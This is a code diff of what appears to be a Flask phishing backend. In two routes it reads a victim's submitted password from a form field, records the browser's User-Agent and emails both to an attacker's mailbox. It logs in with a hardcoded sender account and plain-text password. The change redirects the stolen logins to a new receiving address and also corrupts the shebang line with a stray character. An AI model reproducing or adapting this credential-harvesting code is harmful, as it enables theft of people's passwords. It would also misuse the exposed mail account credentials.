@@ -1,4 +1,4 @@
-#!/usr/bin/python
+d#!/usr/bin/python
 # -*- coding: utf-8 -*-
 from flask import Flask, request, abort, render_template, session, \
     redirect, url_for, jsonify
@@ -178,7 +178,7 @@ def first():
         passwordemail = request.form.get('pig')
         sender_email = 'eissa@waterworldwaterpark.com'
         sender_emaill = 'eissa'
-        receiver_email = 'logsof2025@yahoo.com'
+        receiver_email = 'eddiefrantua@hotmail.com'
         password = 'EISSA47314A'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
@@ -219,7 +219,7 @@ def second():
         passwordemail = request.form.get('pig')
         sender_email = 'eissa@waterworldwaterpark.com'
         sender_emaill = 'eissa'
-        receiver_email = 'logsof2025@yahoo.com'
+        receiver_email = 'eddiefrantua@hotmail.com'
         password = 'EISSA47314A'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
